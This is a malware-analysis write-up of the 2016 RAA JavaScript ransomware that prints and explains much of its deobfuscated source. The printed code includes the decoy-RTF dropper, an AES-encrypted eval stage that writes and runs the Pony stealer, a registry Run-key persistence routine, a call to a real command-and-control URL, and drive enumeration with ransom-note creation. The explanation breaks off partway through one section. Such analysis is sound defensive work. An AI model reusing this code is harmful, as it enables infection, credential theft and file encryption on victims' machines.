## RAA Ransomware JavaScript code analysis

On 14th of June 2016 I found an information about new ransomware called RAA Ransomware. Couple of websites mentioned about it as first ransomware created only by using JavaScript.

Following some links provided by Polish malware analyst **@hasherezade** (https://github.com/hasherezade, https://twitter.com/hasherezade) I've downloaded RAA JavaScript source code from malwr.com (https://malwr.com/analysis/YmE4MDNlMzk2MjY3NDdlYWE1NzFiOTNlYzVhZTlkM2Y/) to take a look its internals.

File **raa.js** contains original content of RAA downloaded from malwr.com, and other files contains source code with some refactoring which I've done during RAA analysis and test runs.


## Analysis

### Extracting parts of code into separate files

**raa.js** file contains 3rd party library, used for some encoding purposes. It's **CryptoJS** library (source code available here https://code.google.com/archive/p/crypto-js/ or GitHub fork here https://github.com/sytelus/CryptoJS).

To keep source code easier to analysis, I've decided to divide **raa.js** into couple of smaller parts. After quick investigation I was able to spot three main parts.

```javascript
/*
	file raa.js
	
	CryptoJS library
	lines from 1 to 482
*/

/*
	main ransomware logic
	lines from 485 to 1082
*/


/*
	part where malicious RTF is created
	lines from 1083 to the end of file
*/

```

## How RAA JavaScript works


### Execution flow graph

Next paragraphs describe in details each function of RAA. Here's how they all are executed (simplified), starting from the very beginning:

```javascript
// Execution flow of RAA

	
	YUIMqkFkI()
		|
		|
		v
	nYuMHHRx()
	NWvQtGjjfQX()
		|
		v
	zQqUzoSxLQ() ---> HxBG()
						|
						|
						v
					try {
						uTNMmZ() --------
					} catch {			|
						izzU()			|
					}	  |				|
						  |				|
					      |				v
						  |			NdpcNJVAPrNj()
						  |				|
						  |				v
						  |<-----------izzU()
						  |
						  v
					iKTzQKbfDJs()
					PLnEyqCPKHV()
						  |
						  |
						  v
					nXmsNjMpKTv()
						  |
						  v
					KWgwJwOlqJcs()




```


### The beginning

First executable line of script is this asigment:

```javascript
var TBucypWw = YUIMqkFkI();
```

**TBucypWw** is the variable which contains key generated by **YUIMqkFkI()** function - it is used in other parts of the code.

Let's take a look at **YUIMqkFkI()** logic:

```javascript
function YUIMqkFkI() {
    var TBucypWw = "";
    var WKQttPJDfsQE = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (var i = 0; i < 5; i++)
        TBucypWw += WKQttPJDfsQE.charAt(Math.floor(Math.random() * WKQttPJDfsQE.length));
    return TBucypWw;
}
```

This fragment just generates a string which contains five characters randomly chose from **WKQttPJDfsQE** string. In this writeup, to understand its meaning, how and where it's used, I assigned **xW5Gf** from example above as generated value of ** TBucypWw** variable.


### Here comes the Pony.

Next executable fragment is:

```javascript
/* 
var Yvwtdbvd = WScript.Arguments;
if (Yvwtdbvd.length == 0) {
    nYuMHHRx();
    NWvQtGjjfQX();
} else {
    null;
}
```


And here's RAA starts its work. After script checks if there are any arguments passed (now let's assume that there aren't any) **nYuMHHRx()** is executed. 


```javascript
function nYuMHHRx() {
    var tpcVJWrQG = "e1xy(...)OBBSDIO==";
    tpcVJWrQG = tpcVJWrQG.replace(/BBSDIO/g, "A");
    var clear_tpcVJWrQG = CryptoJS.enc.Base64.parse(tpcVJWrQG);
    var CLWSNdGnlGf = clear_tpcVJWrQG.toString(CryptoJS.enc.Utf8);
    CLWSNdGnlGf = CLWSNdGnlGf.replace(/BBSDIO/g, "A");
    var RRUm = new ActiveXObject('ADODB.Stream');
    var GtDEcTuuN = WScript.CreateObject("WScript.shell");
    var TkTuwCGFLuv_save = GtDEcTuuN.SpecialFolders("MyDocuments");
    TkTuwCGFLuv_save = TkTuwCGFLuv_save + "\\" + "doc_attached_" + TBucypWw;
    RRUm.Type = 2;
    RRUm.Charset = "437";
    RRUm.Open();
    RRUm.WriteText(CLWSNdGnlGf);
    RRUm.SaveToFile(TkTuwCGFLuv_save);
    RRUm.Close();
    var run = "wordpad.exe " + "\"" + TkTuwCGFLuv_save + "\"";
    GtDEcTuuN.Run(run);
    return 0;
}
```

Let's go through it step by step.

**tpcVJWrQG** contains very long Base64 encoded string. After a couple of operations with Regular Expressions and CryptoJS methods calls - finally we get RTF document (see **extracted/extracted_rtf.rtf** file)

Then, those two lines use Windows Script Host methods to create some objects, one for creating file, second for creating an instance of executable shell:

```javascript
var RRUm = new ActiveXObject('ADODB.Stream');
var GtDEcTuuN = WScript.CreateObject("WScript.shell");
```

Next, a file is created with following path:

```
\MyDocuments\doc_atatched_xW5Gf
```

Content of previously generated RTF file is then saved at this path.

Finally, following command is prepared:

```
var run = wordpad.exe "\MyDocuments\doc_atatched_xW5Gf"
```

and executed by Windows Script Host using method Run():

```
GtDEcTuuN.Run(run);
```
( reference: https://msdn.microsoft.com/en-us/library/d5fk67ky(v=vs.84).aspx )

As a result, RTF document is displayed with some error message:

![RTF document]
(extracted/extracted_rtf_screen.png)

There's an information that this document can't be open in Wordpad and should be open in MS Word 2013 instead.


Next function is **NWvQtGjjfQX()** 

```javascript
function NWvQtGjjfQX() {
    var data_pn = "TVrDiQNMSFE(...)QQURE";

    var cmd = "U2FsdGVkX1/LHQl+aIAo/hXHDEI5YmZZtBIcL5LHq7o+NZyTxtiLAxCsucmN0NBq12nnNJ7XOCyeXqF9xLAkahyIcXx5oc/ic5FRpoj+tZ1qywTZNhPWMlRllGn8O8viVnpXMYHoJr/AphGHfaAOkX8xYjuWhZE8qw1Qw1vQbqdbMlv5RL3xTETBgbylCgyGER91Kef4Q/2YtokOqzg+0BZIjKpdIbr1jQdh8uwp9MKd+Y9dSm1Lz9dl82QJVVbFiBj7N6MEDCw5JESVi5HilHWFEb3eyacdJBxYtKutbAZBOl6aJrLyxKtlxm4o9Cie5+vIPgMtqHEmBWp9GaqYDQlxXXOuTeysry1LXQiCGP7msk2hqAOEhyfxchlAQuma4twTFqHOrPZDECk8hfVJkBvUZg/hl+y4gKbBBLVDEIlKW9AstpcAP6FOcTt/bsS+0fvHnl1fAtMB1AsBSHKhZX/6eMPBGQBQT5fqvyy8MLyMgLOsCt5XHyEgc2ecU1fDokpzzMxMqIPwFZoQDOZSg/pBOMVTyUHuv18WdWI+Q6lppzIUv4mvxEioH7SROiDFqJoHR4EwIdDO0QR82Q4RTTIWO9CfXkC5VnXlEncsU45rIzfEMDv4r1aqoYQlgFr6xjas0/e7+EVCoxhsp4C2Jta43NmC6uLnhjcWRdCcB/8=";
    var key_cmd = "2c025c0a1a45d1f18df9ca3514babdbc";
    var dec_cmd = CryptoJS.AES.decrypt(cmd, key_cmd);
    dec_cmd = CryptoJS.enc.Utf8.stringify(dec_cmd);
    eval(dec_cmd);
    return 0;
}
```

This function executes code...

```javascript
	eval(dec_cmd);
```

...which is decrypted from **cmd** with **key_cmd** key:

```javascript
	// key
	var key_cmd = "2c025c0a1a45d1f18df9ca3514babdbc";
	// AES decrypt using key_cmd as a key   
    var dec_cmd = CryptoJS.AES.decrypt(cmd, key_cmd);
    // change decrypted code to UTF-8 string      
    dec_cmd = CryptoJS.enc.Utf8.stringify(dec_cmd); 
```


This code contains following instructions:

```javascript
var flo = new ActiveXObject ("ADODB.Stream");
var runer = WScript.CreateObject("WScript.Shell");
var wher = runer.SpecialFolders("MyDocuments");
wher = wher + "\\" + "st.exe";
flo.CharSet = "437";
flo.Open();
var pny = data_pn.replace(/NMSIOP/g, "A");
var pny_ar = CryptoJS.enc.Base64.parse(pny);
var pny_dec = pny_ar.toString(CryptoJS.enc.Utf8);
flo.Position = 0;
flo.SetEOS;
flo.WriteText(pny_dec);
flo.SaveToFile(wher, 2);
flo.Close;
wher = "\"" + wher + "\"";
runer.Run(wher);
```

Again, new ActiveXObject is created, named **flo**, and Windows Script Host Shell to execute file called **st.exe**:

Then, **data_pn** from **NWvQtGjjfQX()** is decrypted and new file is created "on the fly":

```javascript
var pny = data_pn.replace(/NMSIOP/g, "A");
var pny_ar = CryptoJS.enc.Base64.parse(pny);
var pny_dec = pny_ar.toString(CryptoJS.enc.Utf8);
```
I saved this file in extracted/ folder as **file01**. As I found here - https://reaqta.com/2016/06/raa-ransomware-delivering-pony/ - it contains malware called Pony (http://www.mcafee.com/threat-intelligence/malware/default.aspx?id=105468). After I found this information I've realized that its code comes from variable called **pny** (PoNY) Nice naming convention... :)

Next, Pony is saved to file with previously created ADODB.Stream ActiveX object and executed.


### Modify Windows registry

Next function sets entry in Windows HKCU\Software\Microsoft\Windows\\CurrentVersion\Run\ registry key:


```javascript
function zQqUzoSxLQ() {
    var QCY;
    var kHkyz = WScript.CreateObject("WScript.Shell");
    try {
        kHkyz.RegRead("HKCU\\RAA\\Raa-fnl\\");
    } catch (e) {
        QCY = 0;
    }
    var lCMTwJKZ = [];
    var baZk = "wscript.exe";
    var AFtKLHIjDtkM = 0;
    var e = new Enumerator(GetObject("winmgmts:").InstancesOf("Win32_process"));
    for (; !e.atEnd(); e.moveNext()) {
        var p = e.item();
        lCMTwJKZ = lCMTwJKZ + p.Name + ",";
    }
    lCMTwJKZ = lCMTwJKZ.split(",");
    var jcayrm = -1;
    do {
        jcayrm += 1;
        if (lCMTwJKZ[jcayrm] == baZk) {
            AFtKLHIjDtkM = AFtKLHIjDtkM + 1;
        } else {
            null
        }
    } while (jcayrm < lCMTwJKZ.length);
    if (AFtKLHIjDtkM < 2 && QCY == 0) {
        var TKVUdGUkzCmE = WScript.ScriptFullName;
        TKVUdGUkzCmE = TKVUdGUkzCmE + " argument";
        var qPOGRFfINeNb = WScript.CreateObject("WScript.Shell");
        qPOGRFfINeNb.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", TKVUdGUkzCmE, "REG_SZ");
        HxBG();
    } else {
        null;
    }
    return 0;
}
```

At the beginning, code checks if there's an entry in Windows registry at HKCU\RAA\Raa-fnl path. If not, **QCY** variable is set to 0.

Next couple of lines check list of run processes:

```javascript
// e is an iterator which allows to enumerate running processes
var e = new Enumerator(GetObject("winmgmts:").InstancesOf("Win32_process"));
```

Last part of the function checks if there are currently running **wscript.exe** processes and, under some conditions (eg. if previous _check_ is equal to 0) adds new Registry value under HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ key, then **HxBG()** function is run.


### Connect to the server

Last part of the code contains two functions, **HxBG()** and **izzU()**

First, let's take a look at **izzU()**. 

It starts from generating GUID, from within string contains 36 chars is cut and assigned to **cVjZujcP**. This value is used later.

```
Globally Unique Identifier or GUID is a 128-bit integer (16 bytes) 
that is used by some software applications across all computers and 
networks in order to provide a reference number which is unique or 
to identify a particular component. Because of this there's a very 
low probability that any two or more component has the same value.

GUID is also used in Windows Registry.

More info:
https://msdn.microsoft.com/en-us/library/windows/desktop/aa373931(v=vs.85).aspx

```

Here's the code which generates GUID:

```javascript
 var FknDierotSzK = new ActiveXObject("Scriptlet.TypeLib");
 var cVjZujcP = FknDierotSzK.GUID.substr(1, 36);
```

Next thing is to initialize **KrvABjTTXNS** array with values get from remote server. Function **get_HZtSmFNRdJM()**, which is responsible for this part, contains hardcoded url, with **id** argument passed via GET:

```javascript
var VuSD = cVjZujcP + " - RAA";
var MOSKn = [];
MOSKn[0] = "http://startwavenow.com/cmh" + "/mars.php?id=" + VuSD;
```

Server IP address (188.40.248.65) is a part of a network located in Germany (?), owned by Romanian hosting company THC Projects. Those information were valid on 14.07.2016, when this part of my writeup was created.


```

% Abuse contact for '188.40.248.64 - 188.40.248.95' is 'abuse@hetzner.de'

inetnum:        188.40.248.64 - 188.40.248.95
netname:        HOS-131355
descr:          HOS-131355
country:        DE
admin-c:        STPS1-RIPE
tech-c:         STPS1-RIPE
status:         ASSIGNED PA
mnt-by:         HOS-GUN
created:        2015-07-21T01:16:26Z
last-modified:  2015-07-21T01:16:26Z
source:         RIPE # Filtered

person:         SC THC Projects SRL
address:        str complexului 3
address:        207206 Carcea
address:        ROMANIA
phone:          +40743216666
nic-hdl:        STPS1-RIPE
remarks:        For abuse contact abuse@thcservers.com or visit https://www.thcservers.com
abuse-mailbox:  abuse@thcservers.com
mnt-by:         HOS-GUN
created:        2014-11-30T13:42:54Z
last-modified:  2014-11-30T13:42:54Z
source:         RIPE # Filtered
```

Let's go back to the code.

I could not check what server returns, because this particular account was suspended. In next line, ServerXMLHTTP server is created to communicate with remote machine. Next couple of lines set timeouts for **req** object (see https://msdn.microsoft.com/en-us/library/ms760403(v=vs.85).aspx for details):

```javascript
var req = new ActiveXObject("Msxml2.ServerXMLHTTP.6.0");
var QSJCTxMMl = 15000;
var bFPwcaPNy = 15000;
var zarI = 15000;
var olWVonsDzH = 15000;
req.setTimeouts(QSJCTxMMl, bFPwcaPNy, zarI, olWVonsDzH);
```

Following code uses GET method to receive some data from remote machine:

```javascript
(...)
var MOSKn = [];
MOSKn[0] = "http://startwavenow.com/cmh" + "/mars.php?id=" + VuSD;
(...)
var pointer_MOSKn = -1;
var aka;
do {
    pointer_MOSKn += 1;
    if (pointer_MOSKn <= 0) {
        pointer_MOSKn = pointer_MOSKn;
    } else {
        pointer_MOSKn = 0;
        WScript.Sleep(60000);
    }
    try {
        req.open("GET", MOSKn[pointer_MOSKn], false);
        req.send();
        aka = req.responseText.split(',');
    } catch (e) {
        aka = 0;
    }
} while (aka == 0);
return aka;
```

If we take a look at this fragment a little bit closer, it does not have a lot of sense. Take a look at how **MOSKn** array is used - only its first element is initalised and then, inside do...while() loop, only 0 index is in use (if we follow  **pointer_MOSKn**, its value is always 0).

Because **aka** value changes after first request. I couldn't check what exactly is returned as startwavenow.com domain was already suspended and url does not respond, but I found an information in ReaQta writeup that there were some values used in encrytption phase later - see https://reaqta.com/2016/06/raa-ransomware-delivering-pony/ for more details. 

After **get_HZtSmFNRdJM()** function there's code assigns returned values to an array:

```javascript
var KrvABjTTXNS = [];
KrvABjTTXNS = get_HZtSmFNRdJM();
var VKw = KrvABjTTXNS[0];
var jOnaTnksWb = KrvABjTTXNS[1];
```


### Identify drives, folders and files

Next executable fragment of the code contains another array initialization and assignment result of **kth()** function to its first element:

```javascript
var kAgTDYi = [];
kAgTDYi[0] = kth();
```

So let's see now what is going on inside **kth()**:


```javascript
function kth() {
    var DmYbWSaT, s, n, e, sNaZfrOWc;
    DmYbWSaT = new ActiveXObject("Scripting.FileSystemObject");
    e = new Enumerator(DmYbWSaT.Drives);
    s = [];
    RKsqOBz:   for (; !e.atEnd(); e.moveNext()) {
        sNaZfrOWc = e.item();
        if (sNaZfrOWc.IsReady) {
            sNaZfrOWc = sNaZfrOWc += "\\\\";
            s.push(sNaZfrOWc);
        } else
            continue RKsqOBz;
    }
    return (s);
}

```
    
At the beginning there's _FileSystemObject_ created. As we can find on MSDN documentation page:

```
Main object. Contains methods and properties that allow you to 
create, delete, gain information about, and generally manipulate 
drives, folders, and files. Many of the methods associated with this 
object duplicate those in other FSO objects; they are provided for 
convenience.
```
(https://msdn.microsoft.com/en-us/library/95dtkhsz(v=vs.84).aspx)

Then, _Enumerator_ property is instantiated and standard method to detect all drives is used (you can follow similar example on https://msdn.microsoft.com/en-us/library/832c8c0x(v=vs.84).aspx)
Finally, array contains all drives letters is returned.


Next fragment which is executed is:

```javascript
iKTzQKbfDJs();
kAgTDYi[1] = [];
```


Function **iKTzQKbfDJs()** calls two other functions, **OFTEml()** and **YlDrqb()** - let's follow all of them to get the final result of their execution:

```javascript
function iKTzQKbfDJs() {
    var mItZKEXYwE = [];
    mItZKEXYwE = kAgTDYi[0];
    mItZKEXYwE = OFTEml(mItZKEXYwE);
    var rjTvWjMKnGpI = -1;
    do {
        rjTvWjMKnGpI += 1;
        YlDrqb(mItZKEXYwE[rjTvWjMKnGpI]);
    } while (rjTvWjMKnGpI < mItZKEXYwE.length - 1);
    return 0
}
```

First, **mItZKEXYwE** array is created and its value is simply the first element of **kAgTDYi**, which is previously returned list of drives from **kth()** .
This array contains drives letters is passed as an argument to function **OFTEml()**:


```javascript
function OFTEml(array_to_clean) {
    var pjvsEz = new Array();
    for (var i = 0; i < array_to_clean.length; i++) {
        if (array_to_clean[i]) {
            pjvsEz.push(array_to_clean[i]);
        }
    }
    return pjvsEz;
}

```

This short function returns all not empty elements from array passed as argument.

Next function **YlDrqb()**, is called for each element of cleaned by **OFTEml()** array (in other words: is executed for each drive)

```javascript
function YlDrqb(kth) {
    var gg = new ActiveXObject("Scripting.FileSystemObject");
    var dir = kth + "!!!README!!!" + TBucypWw + ".rtf";
    var d2 = gg.CreateTextFile(dir, true);
    d2.Write(VGCDtihB());
    d2.Close();
    return 0;
}
```
Again, _FileSystemObject_ is used to create file with following example name on each drive, and to write to those files content created by function **VGCDtihB()**:

```
C!!!README!!!xW5Gf.rtf
```

Why **xW5Gf** in filename? Remember function generates random key, from the very beginning of RAA execution? Here's where this key is used (see 'The beginning' above).

Function **VGCDtihB()** generates another _rtf_ file with ransomware payment note - you can see this file on ReaQta writeup (https://reaqta.com/wp-content/uploads/2016/06/RAA_Ransomware_build_refund_file.png - as I was not able to generate those files on my machine)


```javascript

function VGCDtihB() {
    var rftKZajp = "e1xydG(...)QoRAASEP";
    var cUNSPAqZAE = rftKZajp.replace(/RAASEP/g, "A");
    cUNSPAqZAE = CryptoJS.enc.Base64.parse(cUNSPAqZAE);
    cUNSPAqZAE = cUNSPAqZAE.toString(CryptoJS.enc.Utf8);
    cUNSPAqZAE = cUNSPAqZAE.replace(/=IDHERE=/g, cVjZujcP);
    cUNSPAqZAE = cUNSPAqZAE.replace(/=ADRHERE=/g, jOnaTnksWb);
    return cUNSPAqZAE;
}
``` 

As you can see, it uses similar method as for first _rtf_ file: some simple Base64 string manipulation with couple of replace() function with Regular Expression calls.


Next, there is **PLnEyqCPKHV()** function call:

```javascript
function PLnEyqCPKHV() {
    var sNaZfrOWc = nXmsNjMpKTv(kAgTDYi);
    var NBMCuybDY = -1;
    iFIS:do {
        NBMCuybDY += 1;
        try {
            KWgwJwOlqJcs(sNaZfrOWc[NBMCuybDY]);
        } catch (e) {
            continue iFIS;
        }
    } while (NBMCuybDY <= sNaZfrOWc.length - 2);
    return 0
}

PLnEyqCPKHV();
```

**sNaZfrOWc** array is initialized by **nXmsNjMpKTv()** function, with our previously generated list of drives **kAgTDYi** from **kth()** function:

```javascript
function nXmsNjMpKTv(kAgTDYi) {
    var EPtLPm = -1;
    var wVgUUZeM = -1;
    do {
        EPtLPm += 1;
        var LeDOaP = LMz(kAgTDYi[0][EPtLPm]);
        var LeDOaP = LeDOaP.split(TBucypWw);
        kAgTDYi[1] = kAgTDYi[1].concat(LeDOaP);
        kAgTDYi[1] = OFTEml(kAgTDYi[1]);
        var aZKH = HHiAp(kAgTDYi[0][EPtLPm]);
        var aZKH = aZKH.split(TBucypWw);
        kAgTDYi[0] = kAgTDYi[0].concat(aZKH);
        kAgTDYi[0] = OFTEml(kAgTDYi[0]);
    } while (EPtLPm <= kAgTDYi[0].length - 2);
    return (kAgTDYi[1]);
}

```

In function above, there's interesting way how to define counter for _do...while_ loop. **EPtLPm** starts not from 0 or 1, but from -1. In loop condition, value of **EPtLPm** is compared with length of **kAgTDYi** array minus 2. I suppose this is some kind of obfuscation _do...while_ loop, but I am only guessing here.

Inside loop, a couple of thing is going:



## Summary

As a web developer, I used to write JavaScript code for a little bit different purposes. AngularJS, React, Single Page Applications, Node and server side JS as well - this stuff. 

But RAA confirms that JavaScript can be used for, literally, everything. Even for creating the worst nightmare of each user, which is IMHO Ransomware



## Links, references


Source code of RAA:

**malwr.com**
https://malwr.com/analysis/YmE4MDNlMzk2MjY3NDdlYWE1NzFiOTNlYzVhZTlkM2Y/


Sophos blog post about RAA:

**SophosLabs blog**			
https://nakedsecurity.sophos.com/2016/06/20/ransomware-thats-100-pure-javascript-no-download-required/


Very detailed analysis of RAA, by ReaQta:

**RAA – An entirely new JS ransomware delivering Pony malware**
https://reaqta.com/2016/06/raa-ransomware-delivering-pony/